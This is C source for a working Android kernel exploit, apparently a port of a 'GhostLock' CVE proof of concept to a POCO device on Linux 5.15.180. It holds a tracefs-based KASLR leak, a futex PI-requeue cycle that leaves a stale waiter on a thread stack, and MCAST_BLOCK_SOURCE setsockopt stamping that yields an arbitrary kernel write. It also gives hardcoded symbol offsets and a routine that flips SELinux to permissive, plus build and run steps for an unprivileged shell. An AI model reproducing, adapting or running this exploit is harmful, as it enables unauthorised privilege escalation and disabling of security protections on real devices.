//
// poc_mcast.c — CVE-2026-43499 (GhostLock) IPv4 MCAST port to POCO air 5.15.180
//
// Adapted from mcast_permissive.c (GhostLock reference exploit). The ONLY changes:
//   1) POCO symbol offsets (ksym_offs[] from nm of kernel_5-15-180-vmlinux.elf).
//   2) POCO tracefs KASLR leak (event 108, modal caller @ +0x10, slide = mode - (KIMAGE+0x178510)).
//   3) IPv4 MCAST (AF_INET + IPPROTO_IP + MCAST_BLOCK_SOURCE) as the stamp primitive.
//   4) sendmmsg spray as alternate (POCO-only: only sendmmsg co-locates with freed waiter).
//   5) PROBE mode (env PROBE=1): distinct sentinels to map iov->waiter fields.
//   6) MCAST_DEBUG_RET=1 prints setsockopt ret/errno after copy.
//   7) MCAST_PROBE_INDEX=1 fills 0x108 buffer with qword[i]=i to discover real WAITER_OFF.
//
// Build (NDK r29):
//   aarch64-linux-android35-clang -O2 -static -pthread poc_mcast.c -o poc_mcast
//
// Run (device, uid 2000 shell): ./poc_mcast   (PROBE=1 ./poc_mcast to map fields)
//

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <linux/futex.h>
#include <linux/netlink.h>
#include <linux/xfrm.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

/*============================================================================*/
/*  SECTION 1 : LOGGING (ANSI COLORIZED)                                      */
/*============================================================================*/

enum { PRL_ERR = 0, PRL_WARN = 1, PRL_INFO = 2, PRL_DBG = 3 };

#ifndef PR_LEVEL
#define PR_LEVEL 3
#endif

static void pr_log(int level, const char *prefix, const char *fmt, ...)
{
    if (level > PR_LEVEL)
        return;
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    printf("%s %s\n", prefix, buf);
}

#define pr_err(...)     pr_log(PRL_ERR,  "\033[1;31m[-]\033[0m", __VA_ARGS__)
#define pr_warn(...)    pr_log(PRL_WARN, "\033[1;33m[!]\033[0m", __VA_ARGS__)
#define pr_info(...)    pr_log(PRL_INFO, "\033[1;36m[*]\033[0m", __VA_ARGS__)
#define pr_success(...) pr_log(PRL_INFO, "\033[1;32m[+]\033[0m", __VA_ARGS__)
#define pr_debug(...)   pr_log(PRL_DBG,  "\033[1;30m[~]\033[0m", __VA_ARGS__)

/*============================================================================*/
/*  SECTION 2 : POCO AIR PORT CONFIGURATION                                   */
/*============================================================================*/

#define KIMAGE_TEXT_BASE     0xffffffc008000000ULL

#define SLIDE_EVENT_ID           108
#define SLIDE_WORKER_CALLER_OFF  0x178510ULL
#define SLIDE_MAX_CANDIDATE      0x1f0000ULL

struct ksym { const char *name; uint64_t off; };

/* Offsets are (link_address - KIMAGE_TEXT_BASE). Text symbols live just above
 * the text base; BSS/data symbols are ~0x2d00000 above it. The previous table
 * stored the raw low-32-bits of the link address, which for BSS/data symbols
 * was 0x8000000 too high -> every BSS/data address landed in unmapped memory. */
static const struct ksym ksym_table[] = {
    { "selinux_state",    0x2da9d78ULL },
    { "init_task",        0x2c43640ULL },
    { "empty_zero_page",  0x2d53000ULL },
    { "uid_lock",         0x2dca680ULL },
    { "modprobe_path",    0x2b24120ULL },
    { "panic_timeout",    0x2b20680ULL },
    { "posix_timers_hashtable", 0x2d7c778ULL },
    { "in_lookup_hashtable",    0x2d9b4d8ULL },
    { "ucounts_hashtable",      0x2d55988ULL },
    { "z_pagemap_global",       0x2da10b0ULL },
    { "dax_host_list",          0x2dcb710ULL },
    { "kernfs_pr_cont_buf",     0x2d9f698ULL },
    { "object_map",             0x2d86790ULL },
    { "nf_nat_locks",           0x2ddd808ULL },
    { "unix_socket_table",      0x2de2490ULL },
};

#ifndef STAMP_OFF
#define STAMP_OFF 0x60              /* POCO 5.15.180 IPv4 UDP: WAITER_OFF=0x60 (PROBE confirmed 2026-08-12) */
#endif
#ifndef MCAST_BLOCK_SOURCE
#define MCAST_BLOCK_SOURCE 43
#endif

/*============================================================================*/
/*  SECTION 3 : RESOLVED KERNEL ADDRESSES                                     */
/*============================================================================*/

static uint64_t ks_base;
static uint64_t ks_slide;

static unsigned long k_selinux;
static unsigned long k_init_task;
static unsigned long k_empty_zero_page;
static unsigned long k_fake_lock;
static unsigned long k_fake_lock2;
static unsigned long k_val2mb;

static unsigned long k_resolve(const char *name)
{
    for (size_t i = 0; i < sizeof(ksym_table) / sizeof(ksym_table[0]); i++)
        if (strcmp(name, ksym_table[i].name) == 0)
            return ks_base + ksym_table[i].off;
    return 0;
}

/*============================================================================*/
/*  SECTION 4 : FUTEX CONSTANTS + RAW AARCH64 SYSCALLS                        */
/*============================================================================*/

#ifndef FUTEX_WAIT
#define FUTEX_WAIT 0
#endif
#ifndef FUTEX_WAKE
#define FUTEX_WAKE 1
#endif
#ifndef SCHED_NORMAL
#define SCHED_NORMAL 0
#endif
#ifndef SCHED_BATCH
#define SCHED_BATCH 3
#endif

#define FUTEX_LOCK_PI             6
#define FUTEX_UNLOCK_PI           7
#define FUTEX_WAIT_REQUEUE_PI    11
#define FUTEX_CMP_REQUEUE_PI     12
#define FUTEX_PRIVATE_FLAG      128
#define FUTEX_LOCK_PI_PRIVATE         (FUTEX_LOCK_PI          | FUTEX_PRIVATE_FLAG)
#define FUTEX_WAIT_REQUEUE_PI_PRIVATE (FUTEX_WAIT_REQUEUE_PI  | FUTEX_PRIVATE_FLAG)
#define FUTEX_CMP_REQUEUE_PI_PRIVATE  (FUTEX_CMP_REQUEUE_PI   | FUTEX_PRIVATE_FLAG)

#define __NR_futex_aarch64 98
#ifndef __NR_sched_setscheduler
#define __NR_sched_setscheduler 119
#endif

static long futex_raw(volatile int *u1, long op, long val,
                      long val2, volatile int *u2, long u3)
{
    register long x0 __asm__("x0") = (long)u1;
    register long x1 __asm__("x1") = op;
    register long x2 __asm__("x2") = val;
    register long x3 __asm__("x3") = val2;
    register long x4 __asm__("x4") = (long)u2;
    register long x5 __asm__("x5") = u3;
    register long x8 __asm__("x8") = __NR_futex_aarch64;
    __asm__ volatile("svc #0"
                     : "+r"(x0)
                     : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5), "r"(x8)
                     : "memory", "cc");
    return x0;
}

static long sysc4(long n, long a, long b, long c, long d)
{
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0"
                     : "+r"(x0)
                     : "r"(x8), "r"(x1), "r"(x2), "r"(x3)
                     : "memory");
    return x0;
}

static void sigusr1_handler(int sig) { (void)sig; }

/*============================================================================*/
/*  SECTION 5 : TOPOLOGY (PI cycle: X owns L1 blocks on L2; Y parks cond->L1)*/
/*============================================================================*/

static int pi1  = 0;
static int pi2  = 0;
static int cond = 0;

static atomic_int y_locked_l2 = 0;
static atomic_int x_locked_l1 = 0;
static atomic_int y_parking   = 0;
static atomic_int x_blocking  = 0;

static atomic_int       y_done       = 0;
static volatile int     respray_ready = 0;
static volatile int     respray_done  = 0;
static unsigned long    respray_parent_color = 0;
static unsigned long    respray_value = 0;
static atomic_int       y_tid = 0;
static atomic_int       x_tid = 0;
static size_t           fake_lock2_idx = 0;

static unsigned long y_pol = SCHED_NORMAL;
static long trigger_adj_pi(pid_t tid)
{
    struct sched_param sp = { .sched_priority = 0 };
    long pol = (y_pol == SCHED_NORMAL) ? (long)SCHED_BATCH : (long)SCHED_NORMAL;
    long r = sysc4(__NR_sched_setscheduler, (long)tid, pol, (long)&sp, 0);
    y_pol = (unsigned long)pol;
    return r;
}

/*============================================================================*/
/*  SECTION 6 : TRACEFS KASLR SLIDE LEAK (POCO robust version)               */
/*============================================================================*/

static volatile sig_atomic_t g_kaslr_timed_out;
static void kaslr_on_alarm(int s) { (void)s; g_kaslr_timed_out = 1; }

static int tracefs_write(const char *path, const char *val)
{
    int fd = open(path, O_WRONLY | O_CLOEXEC);
    if (fd < 0) return 0;
    ssize_t n = write(fd, val, strlen(val));
    close(fd);
    return n == (ssize_t)strlen(val);
}

static int sched_blocked_reason_caller_off(void)
{
    int fd = open("/sys/kernel/tracing/events/sched/sched_blocked_reason/format", O_RDONLY | O_CLOEXEC);
    if (fd < 0) return 16;
    char buf[1024]; ssize_t n = read(fd, buf, sizeof(buf) - 1); close(fd);
    if (n <= 0) return 16; buf[n] = 0;
    char *p = strstr(buf, "caller");
    if (!p) return 16;
    int off = -1;
    sscanf(p, "caller;%*[\t ]offset:%d", &off);
    if (off < 0) sscanf(p, "caller; offset:%d", &off);
    if (off < 0) sscanf(p, "field:void* caller; offset:%d", &off);
    return off < 0 ? 16 : off;
}

static uint64_t tracefs_leak_text_base(void)
{
    signal(SIGALRM, kaslr_on_alarm);
    int coff = sched_blocked_reason_caller_off();
    if (!tracefs_write("/sys/kernel/tracing/tracing_on", "0") ||
        !tracefs_write("/sys/kernel/tracing/events/sched/sched_blocked_reason/enable", "1") ||
        !tracefs_write("/sys/kernel/tracing/tracing_on", "1")) {
        pr_warn("tracefs enable failed errno=%d", errno);
        return 0;
    }
    usleep(300000);
    int nprocs = (int)sysconf(_SC_NPROCESSORS_ONLN);
    uint64_t callers[4096]; int n = 0;
    for (int cpu = 0; cpu < nprocs && n < 4096; cpu++) {
        char path[128];
        snprintf(path, sizeof(path), "/sys/kernel/tracing/per_cpu/cpu%d/trace_pipe_raw", cpu);
        int fd = open(path, O_RDONLY | O_CLOEXEC);
        if (fd < 0) continue;
        unsigned char buf[262144]; ssize_t got = 0;
        g_kaslr_timed_out = 0; alarm(2);
        while ((size_t)got < sizeof(buf)) {
            ssize_t r = read(fd, buf + got, (size_t)(sizeof(buf) - got));
            if (r <= 0 || g_kaslr_timed_out) break;
            got += r;
        }
        alarm(0); close(fd);
        for (ssize_t off = 0; off < got && n < 4096;) {
            uint64_t commit; memcpy(&commit, buf + off + 8, 8);
            size_t data_len = (size_t)(commit & 0xfffULL);
            size_t page_end = off + 16 + data_len; if (page_end > (size_t)got) page_end = (size_t)got;
            for (size_t pos = 16; pos + 4 <= page_end && n < 4096;) {
                uint32_t hd; memcpy(&hd, buf + pos, 4);
                uint32_t t = hd & 0x1fU;
                if (t == 30) { pos += 8; continue; }
                if (t == 31) { pos += 12; continue; }
                if (t == 0 || t >= 29) break;
                size_t rec_len = (size_t)t * 4; size_t rec = pos + 4;
                if (rec + rec_len > page_end) break;
                uint16_t eid; memcpy(&eid, buf + rec, 2);
                if (eid == SLIDE_EVENT_ID && rec_len >= (size_t)(coff + 8)) {
                    uint64_t caller; memcpy(&caller, buf + rec + coff, 8);
                    callers[n++] = caller;
                }
                pos = rec + rec_len;
            }
            off = (page_end + 15) & ~(size_t)15;
        }
    }
    tracefs_write("/sys/kernel/tracing/events/sched/sched_blocked_reason/enable", "0");
    tracefs_write("/sys/kernel/tracing/tracing_on", "0");
    if (n == 0) { pr_warn("no sched_blocked_reason samples"); return 0; }

    uint64_t linked = KIMAGE_TEXT_BASE + SLIDE_WORKER_CALLER_OFF;

    /* Rank candidates by frequency; prefer addresses in the kernel text range. */
    typedef struct { uint64_t addr; int cnt; } cand_t;
    cand_t cands[4096]; int nc = 0;
    for (int i = 0; i < n; i++) {
        int c = 0; for (int j = 0; j < n; j++) if (callers[j] == callers[i]) c++;
        int dup = 0;
        for (int k = 0; k < nc; k++) if (cands[k].addr == callers[i]) { dup = 1; break; }
        if (!dup && nc < 4096) { cands[nc].addr = callers[i]; cands[nc].cnt = c; nc++; }
    }
    for (int i = 0; i < nc - 1; i++)
        for (int j = i + 1; j < nc; j++) {
            int pi = (cands[i].addr & 0x1fffff) == (SLIDE_WORKER_CALLER_OFF & 0x1fffff);
            int pj = (cands[j].addr & 0x1fffff) == (SLIDE_WORKER_CALLER_OFF & 0x1fffff);
            if (pj && !pi) { cand_t t = cands[i]; cands[i] = cands[j]; cands[j] = t; continue; }
            if (pi == pj && cands[j].cnt > cands[i].cnt) {
                cand_t t = cands[i]; cands[i] = cands[j]; cands[j] = t;
            }
        }

    for (int ci = 0; ci < nc; ci++) {
        uint64_t mode = cands[ci].addr;
        int64_t slide = (int64_t)mode - (int64_t)linked;
        if (slide <= 0 || (slide & 0x1fffff) != 0 || slide > (int64_t)0x4000000000ULL) {
            pr_debug("tracefs candidate #%d: mode=%016llx cnt=%d slide=%016llx (rejected)",
                     ci, (unsigned long long)mode, cands[ci].cnt, (unsigned long long)slide);
            continue;
        }
        int64_t kaslr_off = 0;
        const char *ko = getenv("KASLR_OFF");
        if (ko && *ko) kaslr_off = (int64_t)strtoll(ko, NULL, 0);
        int64_t base = (int64_t)(KIMAGE_TEXT_BASE + (uint64_t)slide) + kaslr_off;
        pr_info("tracefs base=%016llx slide=%016llx (mode cnt %d, samples %d, candidate #%d mode=%016llx)",
                (unsigned long long)(uint64_t)base, (unsigned long long)slide, cands[ci].cnt, n, ci, (unsigned long long)mode);
        return (uint64_t)base;
    }

    pr_warn("slide reject %016llx (mode %016llx cnt %d) — no valid candidate",
            (unsigned long long)((int64_t)cands[0].addr - (int64_t)linked),
            (unsigned long long)cands[0].addr, cands[0].cnt);
    return 0;
}

/*============================================================================*/
/*  SECTION 7 : MCAST GHOST STAMP                                             */
/*============================================================================*/

#define GROUP_SOURCE_REQ_SIZE 0x108

static void mcast_stamp_stack(int fd, unsigned long fake_lock, unsigned long fake_task,
                              uint64_t marker)
{
    /* MCAST stamp buffer: 264-byte group_source_req copied to kernel stack.
     * We operate on raw bytes so the build doesn't depend on the kernel's
     * internal struct definition. */
    unsigned char gsr[GROUP_SOURCE_REQ_SIZE];
    memset(gsr, 0, sizeof(gsr));
    unsigned char *b = gsr;
    if (getenv("MCAST_PROBE_INDEX")) {
        for (int i = 0; i < (int)(GROUP_SOURCE_REQ_SIZE / 8); i++)
            *((uint64_t *)(b + i * 8)) = (uint64_t)i;
    } else {
        *((uint64_t *)(b + STAMP_OFF + 0x00)) = marker;                 /* rb_parent_color */
        *((uint64_t *)(b + STAMP_OFF + 0x08)) = 0x0UL;                 /* rb_right */
        *((uint64_t *)(b + STAMP_OFF + 0x10)) = 0x0UL;                 /* rb_left */
        *((uint64_t *)(b + STAMP_OFF + 0x18)) = 0x0UL;                 /* pi_tree parent */
        *((uint64_t *)(b + STAMP_OFF + 0x20)) = 0x0UL;                 /* pi_tree right */
        *((uint64_t *)(b + STAMP_OFF + 0x28)) = 0x0UL;                 /* pi_tree left */
        *((uint64_t *)(b + STAMP_OFF + 0x30)) = fake_task;             /* task */
        *((uint64_t *)(b + STAMP_OFF + 0x38)) = fake_lock;             /* lock */
        *((uint64_t *)(b + STAMP_OFF + 0x40)) = 0x0UL;                 /* wake_state+prio */
        *((uint64_t *)(b + STAMP_OFF + 0x48)) = 0x0UL;                 /* deadline */
    }

    int ret = setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
                         gsr, (socklen_t)sizeof(gsr));
    if (getenv("MCAST_DEBUG_RET"))
        pr_info("setsockopt ret=%d errno=%d (%s) STAMP_OFF=0x%x marker=%016llx",
                ret, errno, strerror(errno), STAMP_OFF,
                (unsigned long long)marker);
    /* Do NOT close(fd) — caller reuses it for respray */
}

/*============================================================================*/
/*  SECTION 8 : SENDMMSG SPRAY (POCO alternate, like poc_air)                 */
/*============================================================================*/

static int g_iov_idx = 0;
static const char *g_spray_method = "sendmsg";

static void do_spray(int fd, struct iovec *iov)
{
    if (strcmp(g_spray_method, "writev") == 0) {
        (void)syscall(SYS_writev, (long)fd, (long)iov, 8L);
    } else {
        struct mmsghdr { struct msghdr msg_hdr; unsigned int msg_len; } mv;
        memset(&mv, 0, sizeof mv);
        mv.msg_hdr.msg_iov = iov; mv.msg_hdr.msg_iovlen = 8;
        (void)syscall(SYS_sendmmsg, (long)fd, (long)&mv, 1L, 0L);
    }
}

#define SENT_BASE 0xabcdef0000000000ULL
#define SENT(i) ((void *)(SENT_BASE | ((uint64_t)(i) << 8)))

/*============================================================================*/
/*  SECTION 9 : THREADS                                                       */
/*============================================================================*/

/* Z: walks into the ghost by locking L2 */
static void *thread_Z(void *arg)
{
    (void)arg; atomic_store(&y_tid, syscall(SYS_gettid));
    pr_debug("Z tid=%d", y_tid);
    while (!atomic_load(&y_done)) ;
    pr_debug("Z FUTEX_LOCK_PI(L2): walk into pi_blocked_on");
    long r = futex_raw(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    pr_debug("Z LOCK_PI(L2) returned %ld", r);
    while (1) ;
    return NULL;
}

/* Y: owns L2, parks on cond->L1, then stamps the ghost */
static void *thread_Y(void *arg)
{
    (void)arg; atomic_store(&y_tid, syscall(SYS_gettid));
    pr_debug("Y tid=%d", y_tid);

    long r = futex_raw(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    if (r != 0) { pr_err("Y LOCK_PI(L2) failed: %s", strerror((int)-r)); return NULL; }
    atomic_store(&y_locked_l2, 1);
    while (!atomic_load(&x_locked_l1)) sched_yield();
    atomic_store(&y_parking, 1);
    r = futex_raw(&cond, FUTEX_WAIT_REQUEUE_PI_PRIVATE, 0, 0, &pi1, 0);

    int mcast_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (mcast_fd < 0) { pr_err("Y socket failed errno=%d", errno); return NULL; }

    /* MCAST stamp (the writer primitive under test) */
    uint64_t marker = 0x4D434153544C4F43ULL; /* "MCASTLOC" */
    if (getenv("PROBE")) {
        marker = (uint64_t)SENT(1);
        pr_debug("Y PROBE mode: marker=SENT(1)");
    }

    mcast_stamp_stack(mcast_fd, k_fake_lock, k_init_task, marker);

    atomic_store_explicit(&y_done, 1, memory_order_release);

    /* Park forever: the ghost rt_waiter lives on this stack; kernel PI trees
     * still reference it. Returning would free the stack under a live reference. */
    for (;;) {
        if (respray_ready) {
            respray_ready = 0;
            unsigned char gsr2[GROUP_SOURCE_REQ_SIZE];
            memset(gsr2, 0, sizeof(gsr2));
            *((uint64_t *)(gsr2 + STAMP_OFF + 0x00)) = respray_parent_color; /* rb_parent_color = target-8 */
            *((uint64_t *)(gsr2 + STAMP_OFF + 0x08)) = respray_value;        /* rb_right = value (promoted child) */
            *((uint64_t *)(gsr2 + STAMP_OFF + 0x10)) = 0x0UL;                /* rb_left = 0 (empty) */
            *((uint64_t *)(gsr2 + STAMP_OFF + 0x30)) = k_init_task;          /* task */
            *((uint64_t *)(gsr2 + STAMP_OFF + 0x38)) = k_fake_lock2;        /* lock = fresh fake_lock2 */
            int ret = setsockopt(mcast_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
                                 gsr2, sizeof(gsr2));
            if (getenv("MCAST_DEBUG_RET"))
                pr_info("Y respray ret=%d errno=%d", ret, errno);
            __atomic_store_n(&respray_done, 1, __ATOMIC_RELEASE);
        }
        sched_yield();
    }
    return NULL;
}

/* X: owns L1, then blocks on L2 (held by Y) */
static void *thread_X(void *arg)
{
    (void)arg; atomic_store(&x_tid, syscall(SYS_gettid));
    pr_debug("X tid=%d", x_tid);
    while (!atomic_load(&y_locked_l2)) sched_yield();
    long r = futex_raw(&pi1, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    if (r != 0) { pr_err("X LOCK_PI(L1) failed: %s", strerror((int)-r)); return NULL; }
    atomic_store(&x_locked_l1, 1);
    atomic_store(&x_blocking, 1);
    r = futex_raw(&pi2, FUTEX_LOCK_PI_PRIVATE, 0, 0, NULL, 0);
    pr_debug("X LOCK_PI(L2) returned %ld", r);
    while (1) sched_yield();
    return NULL;
}

/*============================================================================*/
/*  SECTION 10 : WRITE PRIMITIVE (ghost_write_value + respray)                */
/*============================================================================*/

static void ghost_write_value(unsigned long target, unsigned long value)
{
    respray_parent_color = (target - 8) & ~3UL;
    respray_value = value;
    __atomic_store_n(&respray_done, 0, __ATOMIC_RELEASE);
    respray_ready = 1;
    __atomic_thread_fence(__ATOMIC_SEQ_CST);
    while (!respray_done)
        sched_yield();

    long tr = trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire));
    pr_info("write trigger=%ld (value 0x%lx -> 0x%lx)", tr, value, target);

    fake_lock2_idx++;
    if (fake_lock2_idx >= 12) fake_lock2_idx = 0;
    k_fake_lock2 = k_fake_lock + (unsigned long)(fake_lock2_idx + 1) * 8;
}

/*============================================================================*/
/*  SECTION 11 : SELINUX PERMISSIVE FLIP                                     */
/*============================================================================*/

static long read_enforce(void)
{
    FILE *f = fopen("/sys/fs/selinux/enforce", "r");
    long v = -1;
    if (f) {
        if (fscanf(f, "%ld", &v) != 1) v = -1;
        fclose(f);
    }
    return v;
}

static int selinux_permissive(void)
{
    long before = read_enforce();
    if (before == 0) {
        pr_success("selinux already permissive");
        return 0;
    }
    pr_info("selinux = %ld (enforcing)", before);
    usleep(100000);

    /* Step 1 (+0): write value with low byte 0x00 -> enforcing (bool @ +0) = 0.
     * empty_zero_page = 0x...53000 has low byte 0x00, so enforcing clears.
     * byte2 = 0xd5 keeps selinux_state.initialized nonzero (true). */
    ghost_write_value(k_selinux + 0, k_empty_zero_page);
    usleep(1000);

    /* Step 2 (+4): clear policycap[1..2] -> write 2MB-aligned value
     * (low 3 bytes 0x000000) into selinux_state + 4. */
    ghost_write_value(k_selinux + 4, k_val2mb);
    usleep(100000);

    long after = read_enforce();
    if (after == 0) {
        pr_success("selinux = %ld (permissive)", after);
        return 0;
    }
    pr_err("selinux write fail (still %ld)", after);
    return -1;
}

/*============================================================================*/
/*  SECTION 12 : MAIN                                                        */
/*============================================================================*/

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGUSR1, sigusr1_handler);
    pr_debug("tgid=%d", getpid());

    const char *idx = getenv("IOV_IDX");
    if (idx) { int v = atoi(idx); if (v >= 0 && v < 8) g_iov_idx = v; }
    const char *spray = getenv("SPRAY");
    if (spray && (strcmp(spray, "writev") == 0 || strcmp(spray, "sendmsg") == 0))
        g_spray_method = spray;
    pr_info("g_iov_idx=%d spray=%s", g_iov_idx, g_spray_method);

    ks_base = tracefs_leak_text_base();
    if (!ks_base) { pr_err("FATAL: tracefs leak failed"); return EXIT_FAILURE; }
    ks_slide = ks_base - KIMAGE_TEXT_BASE;
    pr_info("KASLR: base=0x%lx slide=0x%lx", ks_base, ks_slide);

    k_selinux       = k_resolve("selinux_state");
    k_init_task     = k_resolve("init_task");
    k_empty_zero_page = k_resolve("empty_zero_page");

    /* fake_lock must be a MAPPED + zeroed region that looks like an empty
     * rt_mutex (owner=0, waiters tree empty). A populated hash table (e.g.
     * posix_timers_hashtable) leaves garbage in its waiters tree -> the walk
     * hits BUG_ON(w->lock != lock) in rt_mutex_top_waiter. Use a small BSS
     * struct with a large zeroed tail (z_pagemap_global, gap 0x4000). */
    const char *fb = getenv("FAKE_MEM");
    if (!fb || !*fb) fb = "z_pagemap_global";
    /* Offset DEEP into the zeroed BSS tail (reference uses creds_hash+0x1000+0x200)
     * so that both fake_lock AND its parent (fake_lock-8) sit in zeroed memory.
     * If parent is still inside a real struct (nonzero prio), the rbtree insert
     * makes our node the LEFT child and the write lands at target-8 (misses
     * selinux->enforcing). 0x1200 guarantees the parent is zeroed -> right child
     * -> write lands exactly at target. */
    unsigned long fake_off = 0x1200;
    const char *fo = getenv("FAKE_OFF");
    if (fo && *fo) fake_off = (unsigned long)strtoull(fo, NULL, 0);
    k_fake_lock  = k_resolve(fb) + fake_off;
    k_fake_lock2 = k_fake_lock + 0x80;

    if (!strcmp(fb, "zero")) {
        k_fake_lock  = k_empty_zero_page;
        k_fake_lock2 = k_empty_zero_page;
    }

    /* 2MB-aligned .bss address (low 21 bits 0) used as step-2 write value so
     * policycap[1..2] bytes become 0x00 (reference: ks_base + 0x2800000). */
    k_val2mb = ks_base + 0x2800000ULL;

    if (!k_selinux || !k_init_task || !k_fake_lock) {
        pr_err("FATAL: unresolved symbols (selinux=%lx init_task=%lx fake_lock=%lx)",
               k_selinux, k_init_task, k_fake_lock);
        return EXIT_FAILURE;
    }
    pr_info("selinux_state = 0x%lx", k_selinux);
    pr_info("init_task     = 0x%lx", k_init_task);
    pr_info("fake base     = %s + 0x%lx", fb, fake_off);
    pr_info("fake_lock     = 0x%lx", k_fake_lock);
    pr_info("fake_lock2    = 0x%lx", k_fake_lock2);
    pr_info("safe_write    = 0x%lx (empty_zero_page)", k_empty_zero_page);
    pr_info("val2mb        = 0x%lx (2MB-aligned)", k_val2mb);

    /* topology */
    pthread_t tx, ty;
    pthread_create(&ty, NULL, thread_Y, NULL);
    while (!atomic_load(&y_locked_l2)) sched_yield();
    pthread_create(&tx, NULL, thread_X, NULL);
    while (!(atomic_load(&y_locked_l2) && atomic_load(&x_locked_l1) &&
             atomic_load(&y_parking)   && atomic_load(&x_blocking))) sched_yield();
    usleep(200000);

    pr_debug("topology ready; CMP_REQUEUE_PI(cond) -> cycle");
    long r = futex_raw(&cond, FUTEX_CMP_REQUEUE_PI_PRIVATE, 1, 0, &pi1, 0);
    cond = 1;
    __atomic_thread_fence(__ATOMIC_SEQ_CST);
    tgkill(getpid(), (int)atomic_load(&y_tid), SIGUSR1);

    pr_debug("CMP_REQUEUE_PI returned %ld", r);
    if (r >= 0) { pr_err("cycle NOT detected"); return EXIT_FAILURE; }
    if (-r != EDEADLK && -r != EDEADLOCK) { pr_err("not EDEADLK: %s", strerror((int)-r)); return EXIT_FAILURE; }
    pr_success("-EDEADLK: full chain walk caught PI cycle");

    while (!atomic_load_explicit(&y_done, memory_order_acquire));

    /* PHASE 1: settle ghost into fake_lock via MIN_CHAINWALK */
    pr_debug("phase1: sched_setscheduler(Y) -> settle ghost");
    if (trigger_adj_pi(atomic_load_explicit(&y_tid, memory_order_acquire)) < 0) {
        pr_err("phase1: sched_setscheduler failed"); return EXIT_FAILURE;
    }
    usleep(100000);
    pr_success("phase1: chain walk settled");

    /* PHASE 2: selinux permissive flip */
    int ret = selinux_permissive();

    pr_warn("stable test: parking forever. do not join/exit Y/X.");
    for (;;) sleep(3600);
    return ret;
}
